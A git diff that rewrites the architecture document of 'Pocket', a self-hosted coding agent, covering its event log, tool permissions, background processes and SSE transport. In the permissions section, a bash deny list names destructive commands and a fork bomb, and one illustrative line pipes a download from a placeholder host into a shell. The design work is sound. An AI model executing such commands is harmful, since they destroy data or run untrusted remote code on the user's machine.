@@ -1,253 +1,734 @@
-# Architecture
+# Pocket — Architecture (v1)
 
-## Error Handling
+> A self-hosted coding agent you drive from your phone. The server runs on your home machine and exposes a tunneled web client. The agent works on your repos, opens PRs, and keeps going while your phone is locked.
 
-The server implements multi-layered error handling to prevent crashes:
+---
 
-### 1. Global Exception Handlers (`server/index.js`)
-- **uncaughtException**: Catches fatal uncaught exceptions, logs with stack trace, attempts graceful shutdown (10s timeout), then exits with code 1
-- **unhandledRejection**: Catches unhandled promise rejections, logs error but doesn't crash (recovery mode)
+## 1. Guiding principles
 
-### 2. Tool Function Resilience (`server/tools/`)
-- **git.js**: All git operations (clone, init, branch, commit, push, status) wrapped in try-catch with proper error logging
-- **file.js**: File operations return errors instead of throwing, listFiles returns empty array on error
-- **command.js**: Commands return error objects with success=false instead of throwing
+These are not platitudes — every decision in this doc traces back to one of them.
 
-### 3. Auto-Restart Mechanism
-- Parent process spawns child Node process
-- Monitors for non-zero exit codes
-- Auto-restarts after 3 seconds if crashed
-- Uses `POCKET_CHILD` env var to prevent infinite spawn loops
+1. **The server is the source of truth.** The client is a window into it. Closing the tab must never stop the agent or lose state.
+2. **Append-only, replayable.** Sessions are an event log on disk. Anything the client missed can be replayed. This is how reconnection becomes a non-feature.
+3. **The agent loop is small. The systems around it are large.** Following Claude Code's design: a 50-line `while` loop calls the model and runs tools. Permissions, persistence, and recovery live in the systems around it.
+4. **Permissions over prompts.** A remote agent that constantly halts for approval is useless. Sensible auto-allow defaults plus a "pending approvals" queue that survives disconnect.
+5. **Defer cleverness.** No subagents, no compaction pipeline, no MCP, no hooks in v1. They have a designed-in seam, but no implementation.
+6. **One transport, one protocol.** SSE for server→client, REST for client→server. No WebSockets, no polling.
 
-## Networking & Deployment
+---
 
-### Local Development
-- **Frontend (Vite/TanStack Start):** Runs on port `3000`.
-- **Backend (Express/WS):** Runs on port `5173`.
-- **Proxy:** Vite proxies `/ws` requests to `localhost:5173`.
-
-### Cloudflare Tunnel Setup
-To expose the application securely:
-1. **Tunnel Configuration:** Map your public domain (e.g., `bolt.clvg.uk`) to `http://localhost:3000`.
-2. **Vite Security:** 
-   - Add the domain to `server.allowedHosts` in `vite.config.ts`.
-   - Set `server.hmr.host` to your domain to allow Hot Module Replacement.
-3. **Secure WebSockets:** The application automatically detects the protocol (`ws:` vs `wss:`) based on `window.location.protocol` to ensure compatibility with Cloudflare's HTTPS.
-
-## Layers
+## 2. System overview
 
 ```
-Frontend (React) → WebSocket Server → Tools (Git, Files, GitHub)
+┌──────────────────────────────────────────────────────────────┐
+│  Browser (TanStack Start, served by the same Node process)   │
+│   ┌──────────────────────────────────────────────────────┐   │
+│   │  EventSource ──► /api/sessions/:id/events  (SSE)     │   │
+│   │  fetch ─────────► /api/sessions/:id/...    (REST)    │   │
+│   └──────────────────────────────────────────────────────┘   │
+└─────────────────────────────┬────────────────────────────────┘
+                              │  Cloudflare tunnel (HTTPS)
+                              ▼
+┌──────────────────────────────────────────────────────────────┐
+│  Node server (single process)                                │
+│                                                              │
+│   ┌───────────────────┐    ┌──────────────────────────────┐  │
+│   │  HTTP layer        │   │  SessionManager              │  │
+│   │  (Fastify/Express) │──►│  (in-memory map, owns        │  │
+│   │  REST + SSE        │   │   AgentRunner instances)     │  │
+│   └───────────────────┘    └──────────┬───────────────────┘  │
+│                                       │ owns                  │
+│                                       ▼                       │
+│                            ┌────────────────────────────┐    │
+│                            │  AgentRunner (per session) │    │
+│                            │  • runs the query loop     │    │
+│                            │  • emits events            │    │
+│                            │  • blocks on permissions   │    │
+│                            └──────────┬─────────────────┘    │
+│                                       │                       │
+│              ┌────────────────────────┼────────────────────┐ │
+│              ▼                        ▼                    ▼ │
+│      ┌─────────────┐          ┌──────────────┐    ┌────────┐│
+│      │  LLM client │          │ Tool         │    │ Event  ││
+│      │ (OpenRouter,│          │ Executor +   │    │ Log    ││
+│      │  streaming) │          │ Permission   │    │(JSONL) ││
+│      └─────────────┘          │ Gate         │    └────────┘│
+│                               └──────┬───────┘               │
+│                                      │                        │
+│                                      ▼                        │
+│                          ┌────────────────────────┐           │
+│                          │  Tools                 │           │
+│                          │  fs · git · bash · web │           │
+│                          │  · plan · todos · gh   │           │
+│                          └────────────────────────┘           │
+└──────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+                 ~/.pocket/sessions/{id}/
+                 ~/.pocket/workspaces/{id}/  (cloned repo)
 ```
 
-## Frontend
+One process, one port. The web client is served by the same Node process that runs the agent — no Vite dev server in production, no separate frontend deployment. In dev, Vite proxies the API and SSE through to the same process.
 
-`apps/web/src/routes/pocket.tsx` - Chat UI
-`apps/web/src/hooks/usePocket.ts` - WebSocket client
+---
 
-### SSR & Hydration
+## 3. The session — your fundamental unit
 
-The app uses TanStack Start with SSR. To prevent hydration mismatches:
+A session is a directory:
 
-- `usePocket` only connects to WebSocket when `wsUrl` is provided
-- `wsUrl` is set in a `useEffect` (runs after hydration), ensuring server and client render with identical initial state
-- This prevents the "A tree hydrated but some attributes didn't match" React warning
+```
+~/.pocket/sessions/{sessionId}/
+├── meta.json         ← repo, task, model, branch, status, timestamps
+├── events.jsonl      ← append-only event log (the source of truth)
+└── permissions.json  ← session-scoped permission grants ("always allow X")
 
-## Backend
-
-`server/index.js` - Express server (polling-based)
-`server/sessions.js` - In-memory session store with disk persistence
-`server/llm.js` - OpenRouter client
-
-**Note**: Pocket uses a polling-based architecture for real-time updates (see [POLLING-MIGRATION.md](POLLING-MIGRATION.md) for details). No WebSocket or SSE connections are used.
-
-### LLM Client (llm.js)
-
-The `streamChat` function handles OpenRouter's streaming API with tool calling:
-
-- Supports both string and array formats for `delta.content` (various LLM providers return different formats)
-- Extracts reasoning content from `delta.reasoning` (DeepSeek) or `delta.reasoning_content` (other providers) and forwards it via `onReasoning`
-- Calls `onStartTurn` before each API request (including multi-turn loops after tool execution)
-- Accumulates tool arguments across streaming chunks
-- Handles `delta.tool_calls` format for tool call streaming
-- Calls `onChunk` for text tokens and `onToolCall` for tool use (start/complete)
-- Multi-turn tool execution: when LLM requests a tool, executes it via `executeTool` callback and feeds result back to LLM
-- Calls `onRaw` with raw parsed data for debugging
-
-```typescript
-streamChat(
-  messages: {role: string, content: string}[],
-  onChunk: (text: string) => void,
-  onToolCall: (toolCall: {name, arguments, status, result?}) => void,
-  executeTool: (toolName: string, args: object) => Promise<object>,
-  onRaw?: (data: object) => void,
-  onStartTurn?: () => void,
-  onReasoning?: (text: string) => void,
-  model?: string
-)
+~/.pocket/workspaces/{sessionId}/
+└── {repo}/           ← the cloned repo, agent's CWD
 ```
 
-**buildSystemMessage** creates the system prompt with repo context:
+**Two key separations:**
+- Metadata (`meta.json`) is small and frequently overwritten. Cheap.
+- The conversation history is **derived from `events.jsonl`** — it's not stored separately. To reconstruct the chat, you replay the log. This is the same insight as Claude Code's append-oriented session storage and Git's object model.
+- The repo workspace is large and lives in a separate tree so deleting old workspaces doesn't touch session metadata.
 
-```typescript
-buildSystemMessage(
-  branchName: string,
-  taskDescription: string,
-  repoName: string,
-  localPath: string
-)
-```
+### Event log shape
 
-**System Prompt Structure**:
-- **Interaction Rules**: Defines when to use tools vs. respond naturally
-- **Available Tools**: Lists all available tools with descriptions
-- **Repository Context**: Includes repo name, branch, task, and local path
+Every event is a single JSON line with `{ seq, ts, type, ...payload }`. The `seq` is a monotonic integer per session — this is what powers SSE resume.
 
-**Important**: The system prompt includes explicit rules to prevent infinite tool-call loops:
-1. Greetings/conversation: Respond naturally without using tools
-2. Repository questions: Explore using tools ONCE, then answer based on results
-3. Do NOT loop - after exploring, answer the user's question directly
+Event types (v1, deliberately small):
 
-## Tools
+| Type | Emitted when |
+|---|---|
+| `user_message` | User sent a chat message |
+| `assistant_text_delta` | LLM streamed text token(s) |
+| `assistant_text_done` | LLM finished a text block |
+| `tool_call_start` | Agent decided to call a tool (args known) |
+| `tool_call_progress` | Long tool emitted progress (e.g. cloning) |
+| `tool_call_result` | Tool returned (success or error) |
+| `permission_requested` | Agent wants to do something that needs approval |
+| `permission_resolved` | User answered a permission request |
+| `status` | `cloning`, `working`, `idle`, `done`, `error` — derived state |
+| `compact_marker` | (v1.5) marks a compaction boundary |
 
-| Tool | File | Description |
-|------|------|-------------|
-| read_file | tools/file.js | Read repo files |
-| write_file | tools/file.js | Write repo files |
-| run_command | tools/command.js | Execute shell |
-| git_clone | tools/git.js | Clone GitHub repo (5min timeout) |
-| git_create_branch | tools/git.js | Create branch |
-| git_commit | tools/git.js | Commit changes |
-| git_push | tools/git.js | Push to remote |
-| github_create_pr | tools/github.js | Create PR |
+**Why this shape:** the client UI is a deterministic function of the event log. Refreshing the page replays events. Reconnecting after a phone-lock replays from `lastSeenSeq`. Two tabs viewing the same session show the same thing because they're rendering the same log.
 
-### Temp Directory
+---
 
-Repositories are cloned to `{os.tmpdir()}/pocket` (e.g., `/tmp/pocket` on Linux, `/var/folders/.../T/pocket` on macOS).
+## 4. The query loop
 
-- **Cross-platform**: Uses `os.tmpdir()` automatically
-- **Automatic cleanup**: Directories older than 7 days are removed on server startup
+This is the heart. It is intentionally a small, readable async generator.
 
-## API Protocol
+```ts
+// pseudo-code, not final
+async function* runTurn(session: Session, userMessage: Message) {
+  session.appendEvent({ type: 'user_message', content: userMessage });
+  session.setStatus('working');
 
-Pocket uses a polling-based architecture with REST API for real-time updates.
+  while (true) {
+    const messages = session.buildMessageHistory();
+    const stream = llm.streamChat({ messages, tools: enabledTools, model: session.model });
 
-### Client → Server (REST API)
-- `POST /api/sessions` - Create new session
-- `POST /api/sessions/local` - Create local session
-- `GET /api/sessions/:sessionId` - Get session state (polling endpoint)
-- `POST /api/sessions/:sessionId/clone` - Clone repository
-- `POST /api/sessions/:sessionId/create_branch` - Create branch
-- `POST /api/sessions/:sessionId/chat` - Send message to agent
-- `POST /api/sessions/:sessionId/commit` - Commit changes
-- `POST /api/sessions/:sessionId/create_pr` - Create pull request
-- `POST /api/sessions/:sessionId/permission` - Respond to permission request
+    let toolCalls: ToolCall[] = [];
 
-### Server → Client (Polling Response)
-The `/api/sessions/:sessionId` endpoint returns the full session state:
-- `session_created` - New session created
-- `session_resumed` - Session loaded from disk
-- `session_data` - Session state update
-- `sessions_list` - List of all sessions
-- `status` - Session status change (includes `message` field for feedback)
-- `user_message` - User message added to history
-- `tool_result` - Tool execution result
-- `error` - Error message
-- `permission_request` - Permission request for tool execution
-- `aborted` - Session aborted
+    for await (const chunk of stream) {
+      if (chunk.type === 'text')
+        yield session.appendEvent({ type: 'assistant_text_delta', text: chunk.text });
+      else if (chunk.type === 'tool_call')
+        toolCalls.push(chunk.toolCall);
+    }
 
-### Debug Messages
-Server sends `debug` messages with raw LLM response data for debugging:
-- `llm_delta` - Raw delta from LLM stream
-- `llm_complete` - Completion details after each turn
+    if (toolCalls.length === 0) break; // model is done
 
-### Loading State
-The frontend derives `isLoading` from status messages. When status is `cloning`, `creating_branch`, or `working`, the UI shows a loading indicator. Terminal states (`ready`, `done`, `error`) clear the loading indicator.
+    // Execute tools (read-only in parallel, writes serial)
+    const results = await toolExecutor.runBatch(toolCalls, session);
+    for (const r of results)
+      session.appendEvent({ type: 'tool_call_result', ...r });
+    // loop back: send tool results to LLM
+  }
 
-### Error Handling
-- **HTTP Errors**: API requests that return non-2xx status codes are caught and displayed with the status code and error message (e.g., `Error 429: Too Many Requests`)
-- **Network Errors**: Failed network requests are caught and displayed with the error message
-- **Server Errors**: Server-sent `error` messages are displayed in the UI with the error text
-
-### Background Sync
-Pocket uses polling to ensure you always see the latest status:
-- **Polling Interval**: Every 5 seconds (5000ms) when a session is active
-- **Endpoint**: `GET /api/sessions/:sessionId`
-- **Response**: Full session state including history, status, and metadata
-- **On visibility change**: When returning to the tab, immediately fetches latest status
-- **Visual indicator**: Shows "Syncing" spinner + last sync time
-
-This ensures you always see the latest state without complex real-time infrastructure.
-
-### Thinking Flow
-When a `chat` message is sent:
-1. User message is added to history
-2. Server processes the message via `streamChat()`
-3. LLM may make tool calls or generate text
-4. After completion, session history is updated and persisted
-5. Client sees updated history on next poll (within 5 seconds)
-
-## Session
-
-```js
-{
-  id, repoUrl, task, githubToken, localPath, branchName,
-  history: [{role, content}],
-  status, // created|cloning|cloned|creating_branch|ready|working|done|error
-  createdAt,
-  lastActivity
+  session.setStatus('idle');
 }
 ```
 
-### Persistence & Background Execution
-Pocket supports long-lived processes. Unlike typical chat applications where the process might stop if the connection is lost, Pocket's agent continues to execute tasks on the server.
-- **WebSocket Disconnect**: Closing the browser tab does *not* delete the session workspace or stop the agent.
-- **Message Routing**: The backend tracks active sessions and routes LLM updates to the most recently connected client for that session.
-- **History Sync**: When a client resumes a session, they receive the full chat history, including any work the agent completed while the client was away.
+**What's deliberately missing:**
+- No "after-turn auto-commit." Auto-commit happens on a separate user-triggered event or via a tool the agent calls. Bundling it into the loop conflates concerns.
+- No reasoning/thinking handling shown — that's just another delta type the LLM client normalizes.
+- No retries, model fallbacks, or context-collapse — those wrap this loop, they don't pollute it.
 
-## Authentication
+**Loop termination guarantees:**
+- Hard cap on turns per user message (e.g. 50). Prevents runaway loops.
+- Hard cap on tokens per session (your chosen pre-compaction strategy — see §8).
+- AbortController on every session — user can stop the agent at any time.
 
-Pocket supports automated GitHub authentication via Personal Access Tokens (PATs).
+---
 
-1. **Default:** Uses `GITHUB_TOKEN` from the server's `.env` file.
-2. **Override:** Users can provide a specific token when starting a new session in the UI.
+## 5. Tools
 
-### Git Operations
-For `git clone` and `git push`, Pocket injects the token directly into the HTTPS URL:
-`https://<token>@github.com/owner/repo.git`
+A tool is a uniform interface. Every tool — file ops, git, web fetch, plan, todos — implements the same contract.
 
-This ensures all operations are non-interactive and bypasses the need for SSH keys in most server environments.
-
-### GitHub API
-Tool-based operations like `github_create_pr` use the token to initialize an `Octokit` instance.
-
-## URL Strategy
-
-The frontend persists the current session ID in the URL using the `sessionId` query parameter:
-- `http://localhost:3000/pocket?sessionId=sess_abc123`
-
-This allows:
-1. **Persistence**: Refreshing the page doesn't lose the active session.
-2. **Deep Linking**: Sharing a session URL (in a local network) allows another tab to resume it.
-
-## Branch Strategy
-
-```
-main → pocket (mirror) → pocket/{timestamp}-{slug} (agent branch) → PR to pocket
+```ts
+interface Tool<I, O> {
+  name: string;                     // "read_file"
+  description: string;              // shown to the LLM
+  inputSchema: ZodSchema<I>;        // also generates the JSON schema sent to LLM
+  isReadOnly: boolean;              // determines parallel vs serial execution
+  defaultPermission: 'allow' | 'ask'; // see §6
+  call(input: I, ctx: ToolContext): AsyncGenerator<Progress, O>;
+}
 ```
 
-## Automatic Flow
+The `call` is an async generator so long-running tools (clone, bash) can stream progress back as `tool_call_progress` events. Non-streaming tools just yield once at the end.
 
-1. **Branch Creation**: When a branch is created via `create_branch`, it is automatically pushed to origin
-2. **Post-Chat Auto-Commit**: After chat completes, any uncommitted changes are automatically committed and pushed
-3. **Manual Controls**: "Commit" and "Create PR" buttons allow manual control over when to commit and create PRs
+### v1 tool inventory
 
-## Frontend UI
+| Tool | Read-only | Default permission | Notes |
+|---|---|---|---|
+| `read_file` | ✓ | allow | path must be inside workspace |
+| `list_files` | ✓ | allow | gitignore-aware |
+| `grep` | ✓ | allow | ripgrep wrapper, paginated, capped output |
+| `glob` | ✓ | allow | for "find files matching X" |
+| `web_fetch` | ✓ | allow | for agent research, capped size |
+| `web_search` | ✓ | allow | OpenRouter / SerpAPI / similar |
+| `git_status` / `git_log` / `git_diff` | ✓ | allow | read-only git |
+| `write_file` | ✗ | allow (in workspace) / ask (outside) | enforced by path check |
+| `edit_file` | ✗ | allow (in workspace) | string-replace style edits |
+| `git_create_branch` | ✗ | allow | per your trust model |
+| `git_commit` | ✗ | allow | per your trust model |
+| `git_push` | ✗ | allow | per your trust model |
+| `github_create_pr` | ✗ | allow | per your trust model |
+| `bash` | ✗ | **rule-matched** (see §6) | per-command matchers, default ask |
+| `bash_background` | ✗ | **rule-matched** (same matchers as bash) | spawns long-running process, returns immediately |
+| `bash_read_output` | ✓ | allow | read buffered output from a background process |
+| `bash_send_input` | ✗ | ask | write to a background process's stdin |
+| `bash_kill` | ✗ | allow | terminate a background process |
+| `list_processes` | ✓ | allow | list this session's background processes |
+| `plan` | ✗ | allow | writes a plan, sets `awaiting_plan_approval` |
+| `todos_write` | ✗ | allow | agent's own scratchpad task list |
 
-The chat interface provides:
-- **Message input**: Type messages to chat with the agent
-- **Thinking indicator**: Animated "Thinking..." badge shown while the LLM is processing, before any tokens arrive
-- **Reasoning panel**: For reasoning-capable models (DeepSeek-R1, Claude 3.7 Sonnet, etc.), the model's internal reasoning is streamed and displayed above the final response in the assistant's message bubble
-- **Commit button**: Manually commits and pushes current changes
-- **Create PR button**: Creates a pull request to the `pocket` branch
-- **View PR link**: Appears after a PR is created
+### Read-only parallelism
+
+The executor partitions a batch of tool calls: read-only tools run concurrently with `Promise.allSettled`, write tools run sequentially. This matches Claude Code's pattern and gives 3–5× speedups on file exploration.
+
+### Path safety
+
+Every file-touching tool resolves paths against `workspace_root` and rejects anything that escapes (`..` traversal, symlink-out, absolute paths). This is enforced once in `ToolContext.resolvePath()` rather than re-implemented per tool.
+
+---
+
+## 6. Permission system — the linchpin for remote operation
+
+Because you're driving this from your phone, permissions are not an annoying ceremony — they're the difference between "agent works while I'm at lunch" and "agent halts immediately and I never see it."
+
+### Decision pipeline
+
+When a tool is about to run, the gate runs through these in order, first match wins:
+
+```
+Tool call arrives
+   │
+   ▼
+1. Session-scoped allow rules  (you said "always allow bash for this session")
+   │ no match
+   ▼
+2. Static defaults             (table in §5: read-only → allow, bash → ask)
+   │ ask
+   ▼
+3. Per-tool safety checks      (e.g. write_file outside workspace → ask, even if rule said allow)
+   │
+   ▼
+4. Emit `permission_requested` event, agent loop awaits resolution
+```
+
+### Trust model defaults (your choices, codified)
+
+```ts
+const v1Defaults: PermissionDefaults = {
+  // Auto-allow, unconditionally
+  read_file:           'allow',
+  list_files:          'allow',
+  grep:                'allow',
+  glob:                'allow',
+  git_status:          'allow',
+  git_log:             'allow',
+  git_diff:            'allow',
+  git_create_branch:   'allow',
+  git_commit:          'allow',
+  github_create_pr:    'allow',
+  web_fetch:           'allow',
+  web_search:          'allow',
+
+  // Allow inside workspace, ask outside
+  write_file:          'conditional',
+  edit_file:           'conditional',
+
+  // Allow only on a non-protected branch
+  git_push:            'conditional',
+
+  // Per-command matchers, default ask
+  bash:                'rule-matched',
+};
+```
+
+`conditional` means the tool's `safetyCheck()` evaluates the input. For `write_file`/`edit_file`: allow if path is inside workspace, ask otherwise. For `git_push`: allow if current branch is not in the protected set, ask otherwise.
+
+### Bash command matchers
+
+Bash is the spiciest tool. A regex/glob matcher gates it:
+
+```ts
+// ~/.pocket/config.json  (overridable per-session)
+{
+  "bashAllow": [
+    // Test runners and builds
+    "^npm (run )?(test|build|lint|typecheck|format)( .*)?$",
+    "^pnpm (run )?(test|build|lint|typecheck|format)( .*)?$",
+    "^yarn (test|build|lint|typecheck|format)( .*)?$",
+    "^npx tsc( .*)?$",
+    "^nx (test|build|lint|typecheck|run|run-many)( .*)?$",
+
+    // Read-only diagnostics
+    "^ls( .*)?$",
+    "^cat [^|;&`$()]*$",       // cat with a single arg, no shell metacharacters
+    "^pwd$",
+    "^echo [^|;&`$()]*$",
+    "^which .*$",
+    "^node --version$",
+    "^node -v$"
+  ],
+  "bashDeny": [
+    // Hard deny — these never auto-allow even if they match an allow rule
+    "rm -rf /",
+    "^sudo ",
+    ":\\(\\)\\{ :\\|:& \\};:"   // fork bomb
+  ]
+}
+```
+
+**Match logic** (in this order):
+1. If any `bashDeny` regex matches → **deny** (no override, even by user "always allow")
+2. If any `bashAllow` regex matches → **allow**
+3. Otherwise → **ask**
+
+**Why allow rules are conservative regexes, not "any command starting with `npm`":**
+- `npm test && curl evil.com | sh` starts with `npm` and is catastrophic
+- The matchers anchor with `^...$` and forbid shell metacharacters in argument positions where they're dangerous
+- `cat` allows a single path argument with no metacharacters; `cat foo.txt | curl ...` doesn't match
+
+**Why a deny list at all:**
+Defense in depth. If you (or a future config edit) accidentally write a too-broad allow rule, the deny list still blocks the catastrophic cases. The deny list is intentionally tiny — it's not a sandbox, it's a panic brake.
+
+### Protected branches (for `git_push`)
+
+```ts
+const protectedBranches = ['main', 'master', 'develop', 'pocket', 'staging', 'production'];
+```
+
+`git_push` resolves `conditional`:
+- If `git rev-parse --abbrev-ref HEAD` returns a name in `protectedBranches` → **ask**
+- If detached HEAD (e.g. mid-rebase, agent shouldn't push from here anyway) → **ask**
+- Otherwise → **allow**
+
+This means the agent can freely push the working branch (`pocket/{timestamp}-{slug}`) but is stopped before pushing to `main` even if it somehow checked it out. Combined with the v1 design where `git_create_branch` always creates a fresh agent branch, you should never see this prompt — but you'll see it loud and clear if something's gone wrong, which is exactly when you want a halt.
+
+The protected list is per-session-overridable via the same permissions config. If you ever want the agent to genuinely push to `main` (you won't, but), you can add a session-scoped allow.
+
+### How "ask" works without blocking the loop
+
+When a tool needs approval, the agent emits `permission_requested` and the runner awaits a Promise. The Promise resolves when one of:
+- User clicks Allow / Deny in the client (REST POST: `/api/sessions/:id/permission`)
+- User selects "Always allow this tool for this session" (writes to `permissions.json` and resolves Allow)
+- Timeout fires (e.g. 30 minutes) — resolves Deny with reason "timeout"
+
+**Critical UX detail:** when the user reconnects, the client receives all unresolved `permission_requested` events as part of the replay. The UI shows them as a "pending approvals" queue, not as a single blocking modal. This is what makes "agent worked while phone was locked, now I review the queue" feel natural.
+
+### Web push (deferred to v1.5)
+
+Browser Push API for "agent needs your approval" notifications. Designed-in but not implemented in v1 — you'll just see a count badge when you reopen the tab.
+
+---
+
+## 7. Background processes
+
+Some commands shouldn't block the agent loop — `npm run dev`, `nx serve`, file watchers, anything that's "start it and then come back to it." Pocket models these as first-class session resources.
+
+### The process manager
+
+Each session owns a `ProcessManager` that tracks its background processes. A process has:
+
+```ts
+interface BackgroundProcess {
+  id: string;              // 'proc_a1b2c3' — stable, agent-facing
+  pid: number;             // OS-level
+  command: string;         // the original bash string
+  startedAt: number;
+  status: 'running' | 'exited' | 'killed';
+  exitCode?: number;
+  stdout: RingBuffer;      // capped at 4MB, line-aware
+  stderr: RingBuffer;      // capped at 4MB, line-aware
+  cwd: string;             // workspace path
+}
+```
+
+The agent never sees PIDs — it only uses the stable `id`. PIDs change if the OS recycles them; the process manager tracks the mapping.
+
+### Output buffering
+
+Each stream is a ring buffer capped at 4MB (configurable). When full, the oldest *complete lines* are dropped, not raw bytes — never hand the LLM a half-line. The buffer also tracks a `lastReadOffset` per process so `bash_read_output` can return "everything new since I last looked."
+
+At 4MB per stream × 2 streams × N processes, this can add up. The ProcessManager enforces a session-wide cap of 8 concurrent background processes; beyond that, new spawns require an `ask` confirmation regardless of the bash matchers. This prevents an agent in a tight loop from spawning hundreds of processes and OOMing the server.
+
+### The four tools
+
+```ts
+// Spawn — returns immediately, agent gets the id
+bash_background({ command: "npm run dev", cwd?: string })
+  → { id: "proc_a1b2c3", pid: 12345 }
+
+// Read — three modes for different agent intents
+bash_read_output({
+  id: "proc_a1b2c3",
+  mode: "since_last_read" | "tail" | "all",
+  lines?: number,           // for tail mode
+  stream?: "stdout" | "stderr" | "both"  // default both, interleaved
+})
+  → { stdout: "...", stderr: "...", isRunning: true, droppedLines: 0 }
+
+// Send input (for processes prompting on stdin — rare but real)
+bash_send_input({ id: "proc_a1b2c3", input: "y\n" })
+  → { ok: true }
+
+// Kill — SIGTERM, then SIGKILL after 5s if still alive
+bash_kill({ id: "proc_a1b2c3" })
+  → { exitCode: -15, runtimeMs: 47230 }
+
+// List — for the agent to see what it has running
+list_processes()
+  → [{ id, command, status, runtimeMs, hasUnreadOutput }, ...]
+```
+
+### Lifetime and crash recovery
+
+Processes are **bound to the session.** When a session ends (status → `done` or explicit close), all its background processes get SIGTERM'd. The process manager registers an `exit` handler on the Node process to do this for the whole server, so a clean shutdown leaves no orphans.
+
+The harder case: server crash. PIDs are persisted to `meta.json` after every spawn. On startup, the SessionManager:
+
+1. Reads each session's tracked PIDs
+2. For each PID, checks if it's still alive (`process.kill(pid, 0)`)
+3. If alive: it's almost certainly an unrelated process by now (PID reuse) — emit a warning event, mark the process record as `lost`, do not adopt it
+4. If dead: mark as `exited` with unknown exit code
+
+The agent never inherits processes from a previous server run. This is intentional — it's safer to make the agent re-spawn than to adopt processes whose state is unknown.
+
+### Why `bash_send_input` is `ask` by default
+
+Sending input to a running process is rare and almost always indicates the agent is trying to answer an interactive prompt — exactly the moment you want a human in the loop. Most well-behaved tools have a `--yes` flag or non-interactive mode the agent should use first. If you find yourself approving this constantly, the right fix is usually a CLI flag, not auto-allowing the tool.
+
+### What background processes are NOT for
+
+- **Test runs you want to wait for** — that's `bash` (foreground), which already supports streaming output via the tool's progress events
+- **Quick commands** — anything under ~30s should just be `bash`. Background processes have overhead (manager bookkeeping, PID persistence, ring buffers).
+- **Persistent services** — Pocket isn't a process supervisor. Don't run production services through it.
+
+### Bash timeout for foreground commands
+
+Related question this raises: foreground `bash` needs a timeout, otherwise an agent that accidentally runs `npm run dev` (instead of `bash_background`) hangs the session forever. Default: **5 minutes**, configurable per-call up to 30 minutes. On timeout, the process gets SIGTERM, output is returned with `{ timedOut: true }`, and the agent can decide whether to re-run as background. This is a one-line addition to the existing bash tool, but it's load-bearing.
+
+---
+
+
+
+## 8. Real-time transport — SSE + REST
+
+### The endpoints
+
+| Method | Path | Purpose |
+|---|---|---|
+| `POST` | `/api/sessions` | Create session, returns `{ id }` |
+| `GET` | `/api/sessions` | List sessions (for history page) |
+| `GET` | `/api/sessions/:id` | Session metadata (status, model, branch) |
+| `GET` | `/api/sessions/:id/events` | **SSE stream**, supports `Last-Event-ID` |
+| `POST` | `/api/sessions/:id/messages` | Send chat message |
+| `POST` | `/api/sessions/:id/abort` | Stop the agent mid-turn |
+| `POST` | `/api/sessions/:id/permission` | Resolve a permission request |
+| `POST` | `/api/sessions/:id/commit` | Manual commit |
+| `POST` | `/api/sessions/:id/pr` | Create PR |
+| `DELETE` | `/api/sessions/:id` | Archive session (workspace deletion is separate) |
+
+### Why SSE specifically
+
+- One TCP connection, one direction (server → client). Simple to reason about.
+- `Last-Event-ID` header is built-in. The server reads it on (re)connect, opens `events.jsonl`, fast-forwards past that seq, and streams the rest. No custom replay protocol to design.
+- `EventSource` handles automatic reconnection in the browser. You don't write the reconnect loop.
+- Falls through Cloudflare tunnels, corporate proxies, every browser. WebSockets occasionally don't.
+- Native HTTP means observability (curl, browser devtools) just works.
+
+### The reconnect contract
+
+```
+Client opens SSE: GET /api/sessions/abc/events
+  Header: Last-Event-ID: 47
+
+Server:
+  1. Open events.jsonl, seek past seq=47
+  2. Stream all events with seq > 47 immediately
+  3. Subscribe to live event emitter for this session
+  4. As new events append, push them with their seq as `id:`
+```
+
+The `id:` field on each SSE message is the seq number. This is what `EventSource` automatically sends back as `Last-Event-ID` after a disconnect. You get resume for free.
+
+### Heartbeats
+
+Send a `: heartbeat\n\n` SSE comment every 15 seconds. This keeps Cloudflare's tunnel alive (it idles connections at ~100s) and lets the client detect a dead server faster than TCP would.
+
+---
+
+## 9. Token cap (your chosen alternative to compaction)
+
+Per your decision: no compaction pipeline in v1. Instead:
+
+```
+On every turn boundary:
+  estimatedTokens = countTokens(messageHistory)
+  if estimatedTokens > model.contextWindow * 0.75:
+    emit `status: warning, message: 'Approaching context limit'`
+  if estimatedTokens > model.contextWindow * 0.90:
+    block further user messages, surface "Start fresh" CTA
+```
+
+### `/new-session-with-context` command
+
+A user-invoked slash command that:
+1. Asks the LLM to produce a short brief from the current session's history (a single non-streaming call)
+2. Creates a new session with the same repo, branch, and config
+3. Prepends the brief as a system note: *"Continued from session {old_id}. Summary: ..."*
+4. The old session is preserved untouched (you can scroll back)
+
+This solves 80% of long-session pain for ~50 lines of code. Real compaction is a v1.5 task once you've seen which sessions actually fill the window.
+
+### Token counting
+
+Use `gpt-tokenizer` or `tiktoken` for an estimate. OpenRouter doesn't return reliable token usage per delta, so you estimate, and reconcile with the API's reported usage at end-of-turn. Estimate is fine — you only need to know "are we close?" not exact counts.
+
+---
+
+## 10. LLM provider layer
+
+Stays on OpenRouter, but isolated behind one interface so you're not stuck:
+
+```ts
+interface LLMProvider {
+  streamChat(req: ChatRequest): AsyncGenerator<LLMChunk, ChatUsage>;
+  countTokens(messages: Message[]): number;
+  capabilities(model: string): { contextWindow, supportsTools, supportsReasoning };
+}
+```
+
+`OpenRouterProvider` implements this. Switching to direct Anthropic later (for prompt caching) means writing one new class, not refactoring the loop.
+
+### Stream normalization
+
+OpenRouter routes to many providers, each with quirks. Normalize them at the edge:
+- `delta.content` may be string or array (your existing observation)
+- Reasoning lives in `delta.reasoning` (DeepSeek) or `delta.reasoning_content` (others) — collapse both to `chunk.reasoning`
+- Tool calls stream incrementally (args arrive as fragments) — accumulate them per `tool_call.id` and emit a single `tool_call` chunk when complete
+- Some providers emit usage in the final SSE event, others don't — accept both
+
+This logic lives in `OpenRouterProvider`, not in the agent loop. The loop only sees normalized `LLMChunk`s.
+
+---
+
+## 11. Frontend (TanStack Start)
+
+Project structure stays in your existing monorepo:
+
+```
+apps/web/
+  src/
+    routes/
+      index.tsx              ← session list / new session form
+      sessions/$id.tsx       ← active chat UI
+    state/
+      session.ts             ← Zustand or signals store, fed by SSE
+      events.ts              ← reducer: events[] → derived UI state
+    hooks/
+      useSessionStream.ts    ← EventSource wrapper, handles reconnect/replay
+      useApi.ts              ← typed fetch wrapper for REST endpoints
+    components/
+      MessageList.tsx
+      MessageBubble.tsx
+      ToolCallCard.tsx       ← collapsed tool calls with expand-to-see-output
+      PermissionPrompt.tsx   ← "agent wants to run bash: `npm test`"
